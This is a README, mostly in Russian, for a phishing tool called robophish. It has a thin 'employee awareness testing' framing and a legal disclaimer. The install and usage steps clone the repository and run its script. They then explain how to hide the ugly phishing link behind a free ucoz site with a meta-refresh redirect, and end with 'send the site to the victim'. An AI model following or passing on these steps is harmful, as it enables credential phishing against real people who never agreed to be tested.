
# robophish v4.1 Lite
## Author: github.com/thelinuxchoice
## Upgraded by github.com/gasayminajj

## Cредство проверки работников организации на осведомленность с информационными угрозами для компании
## Покупка полной версии продукта обговаривается индивидульно.


## Правовая оговорка(Legal disclaimer):

Usage of robophish for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 
Использование robophish для атаки целей без предварительного взаимного согласия является незаконным. Конечный пользователь обязан соблюдать все применимые местные, государственные и федеральные законы. Разработчики не несут никакой ответственности и не несут ответственности за любое неправильное использование или ущерб, причиненный этой программой
![alt text](https://i.imgur.com/5Lg1q2I.png)

## Android(Termux) Install:
```
pkg update
pkg upgrade
apt install curl git php -y
git clone https://github.com/gasayminajj/robophish
Дальше все интуитивно понятно, нажимаем по ссылке(она оч некрасивая, нужно с ней что-то делать)
Идем на сайт www.ucoz.com(не реклама) и создаем пустой сайт, главное выбрать более менее красивый url.
Заходим в HTML редатор.
Добавляем туда скрипт на переадресацию на наш сайт

HTML:

<head>
<meta http-equiv="refresh" content="1;URL=ссылка" />
</head>

Скидываем сайт жертве.
```
## Linux Install:
```
apt update & apt upgrade
apt install curl git php -y
git clone https://github.com/gasayminajj/robophish
Дальше все интуитивно понятно, нажимаем по ссылке(она оч некрасивая, нужно с ней что-то делать)
Идем на сайт www.ucoz.com(не реклама) и создаем пустой сайт, главное выбрать более менее красивый url.
Заходим в HTML редатор.
Добавляем туда скрипт на переадресацию на наш сайт

HTML:

<head>
<meta http-equiv="refresh" content="1;URL=ссылка" />
</head>

Скидываем сайт жертве.
```
### Использование:
```
cd robophish
bash robophish.sh
Если вы используете Андроид, то нужно выключить wifi, включить Мобильный интернет, режим модема. БЕЗ ЭТОГО РАБОТАТЬ НИЧЕГО НЕ БУДЕТ
```
